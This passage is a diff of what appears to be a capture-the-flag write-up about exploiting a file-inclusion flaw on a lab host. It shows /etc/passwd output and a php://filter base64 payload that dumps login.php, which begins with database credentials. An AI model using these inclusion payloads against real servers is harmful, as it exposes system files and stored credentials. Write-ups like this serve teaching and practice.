@@ -131,32 +131,7 @@ mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 5. Using the base64 encoding with filter we can exfiltrate the content of the PHP file; for this we can use the filter with `http://10.10.213.211/secret-script.php?file=php://filter/read=convert.base64-encode/resource=login.php` to check the content and validations for login page
 6. This payload will return the base64 encoded version of `login.php` page (we can use the Burp Suite Decoder, or Linux based tools to decode):
 ```php
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    <link rel="stylesheet" href="login.css">
-</head>
-<body>
-    <div class="login-container">
-        <h1>Login</h1>
-        
-        <form method="POST">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <button type="submit">Login</button>
-        </form>
-        
-    </div>
-    <?php
+<?php
 // Replace these with your database credentials
 $servername = "localhost";
 $user = "comte";
